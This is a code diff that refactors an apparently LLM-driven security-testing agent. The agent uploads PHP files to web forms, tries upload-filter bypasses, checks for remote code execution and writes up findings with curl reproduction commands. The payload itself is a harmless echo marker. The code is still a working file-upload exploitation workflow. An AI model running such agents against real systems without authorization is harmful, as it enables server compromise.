@@ -78,77 +78,73 @@ class FileUploadAgent(BaseAgent):
             logger.error(f"Discovery failed: {e}")
             return []
 
+    def _get_upload_strategy(self, attempt: int, strategy: Optional[Dict], form: Dict) -> Optional[Tuple[str, str, str]]:
+        """Get upload strategy from LLM response or fallback."""
+        if not strategy or not strategy.get('vulnerable') == 'true':
+            if attempt == 0:
+                # Fallback strategy for Level 0 if LLM fails or says no
+                return ('BT7331_RCE_payload.php', '<?php echo "BT7331_SUCCESS"; ?>', 'application/x-php')
+            return None
+
+        filename = strategy.get('filename', 'rce.php')
+        payload = strategy.get('payload_content', '<?php echo "BT7331_SUCCESS"; ?>')
+        content_type = strategy.get('content_type', 'application/x-php')
+        return (filename, payload, content_type)
+
+    def _create_upload_finding(self, filename: str, uploaded_url: str, response_text: str, valid_execution: bool) -> Dict:
+        """Create finding dictionary for successful upload."""
+        evidence = f"Response confirms upload: {response_text[:100]}"
+        if "RCE_FLAG" in response_text:
+            evidence = f"RCE Flag Found in response: {response_text}"
+
+        method_desc = "RCE via Execution" if valid_execution else "Arbitrary File Upload (Name Trigger)"
+        return {
+            "type": "File Upload / RCE",
+            "vulnerability": "Unrestricted File Upload / RCE",
+            "url": self.url,
+            "exploit_url": uploaded_url,
+            "filename": filename,
+            "confidence": 1.0,
+            "method": method_desc,
+            "evidence": evidence,
+            "validated": True,
+            "severity": "CRITICAL",
+            "status": "VALIDATED_CONFIRMED",
+            "description": f"Unrestricted file upload vulnerability allowing Remote Code Execution. Uploaded malicious file '{filename}' was successfully executed on the server. Method: {method_desc}",
+            "reproduction": f"# Upload malicious file:\ncurl -X POST '{self.url}' -F 'file=@{filename}'\n# Access uploaded file:\ncurl '{uploaded_url}'"
+        }
+
     async def _test_form(self, form: Dict) -> Optional[Dict]:
         """Orchestrate testing for a specific form with bypass loops."""
         dashboard.log(f"[{self.name}] Testing upload form: {form['id']}", "INFO")
-        
         previous_response = ""
-        
+
         for attempt in range(self.MAX_BYPASS_ATTEMPTS + 1):
             if attempt > 0:
                 dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
-            
+
             # Phase 1: Call LLM for strategy (or bypass)
             strategy = await self._llm_get_strategy(form, previous_response)
-            
-            if not strategy or not strategy.get('vulnerable') == 'true':
-                if attempt == 0:
-                    # Fallback strategy for Level 0 if LLM fails or says no
-                    strategy = {
-                        'vulnerable': 'true',
-                        'filename': 'BT7331_RCE_payload.php',
-                        'payload_content': '<?php echo "BT7331_SUCCESS"; ?>',
-                        'content_type': 'application/x-php'
-                    }
-                else:
-                    break
+            strategy_result = self._get_upload_strategy(attempt, strategy, form)
 
-            # Ensure we have the basics
-            filename = strategy.get('filename', 'rce.php')
-            payload = strategy.get('payload_content', '<?php echo "BT7331_SUCCESS"; ?>')
-            content_type = strategy.get('content_type', 'application/x-php')
+            if not strategy_result:
+                break
 
+            filename, payload, content_type = strategy_result
             dashboard.log(f"[{self.name}] Attempting upload: {filename} ({content_type})", "INFO")
-            
+
             # Phase 2: Execute Upload
-            success, response_text, uploaded_url = await self._upload_file(
-                form, 
-                filename, 
-                payload, 
-                content_type
-            )
-            
+            success, response_text, uploaded_url = await self._upload_file(form, filename, payload, content_type)
             previous_response = response_text
-            
+
             if success:
                 # Phase 3: Validate Execution
                 valid_execution = await self._validate_execution(uploaded_url)
-                
-                # Dojo validation: Check if text confirms upload or contains flags
                 valid_upload = f"Uploaded: {filename}" in response_text or "RCE_FLAG" in response_text
-                
+
                 if valid_execution or valid_upload:
                     dashboard.log(f"[{self.name}] 🏆 File Upload Vulnerability CONFIRMED!", "SUCCESS")
-                    evidence = f"Response confirms upload: {response_text[:100]}"
-                    if "RCE_FLAG" in response_text:
-                         evidence = f"RCE Flag Found in response: {response_text}"
-                    
-                    method_desc = "RCE via Execution" if valid_execution else "Arbitrary File Upload (Name Trigger)"
-                    return {
-                        "type": "File Upload / RCE",  # Normalized type field
-                        "vulnerability": "Unrestricted File Upload / RCE",
-                        "url": self.url,
-                        "exploit_url": uploaded_url,
-                        "filename": filename,
-                        "confidence": 1.0,
-                        "method": method_desc,
-                        "evidence": evidence,
-                        "validated": True,
-                        "severity": "CRITICAL",
-                        "status": "VALIDATED_CONFIRMED",
-                        "description": f"Unrestricted file upload vulnerability allowing Remote Code Execution. Uploaded malicious file '{filename}' was successfully executed on the server. Method: {method_desc}",
-                        "reproduction": f"# Upload malicious file:\ncurl -X POST '{self.url}' -F 'file=@{filename}'\n# Access uploaded file:\ncurl '{uploaded_url}'"
-                    }
+                    return self._create_upload_finding(filename, uploaded_url, response_text, valid_execution)
             else:
                 dashboard.log(f"[{self.name}] 🛡️ Upload blocked or failed. {len(response_text)} bytes returned.", "WARN")
 
